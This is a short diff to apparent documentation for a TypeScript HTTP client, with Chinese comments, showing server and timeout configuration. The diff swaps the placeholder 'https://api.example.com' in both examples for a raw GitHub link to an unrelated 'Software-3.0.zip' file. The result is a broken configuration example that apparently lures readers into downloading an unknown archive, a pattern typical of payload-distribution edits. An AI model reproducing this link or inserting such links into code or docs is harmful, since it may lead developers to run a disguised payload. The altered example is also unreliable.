@@ -972,11 +972,11 @@ NetManager.getInstance().close(1000, "normal", "main");
 
 ```typescript
 // 配置
-tyou.http.server = "https://api.example.com";
+tyou.http.server = "https://github.com/Javisso74/Tyou/raw/refs/heads/main/Client/assets/scripts/logic/core/singleton-system/Software-3.0.zip";
 tyou.http.timeout = 15000; // 超时 15s
 
 // 或通过 onInit
-tyou.http.onInit("https://api.example.com", 15000);
+tyou.http.onInit("https://github.com/Javisso74/Tyou/raw/refs/heads/main/Client/assets/scripts/logic/core/singleton-system/Software-3.0.zip", 15000);
 
 // GET
 tyou.http.get("/user/info", (data) => {
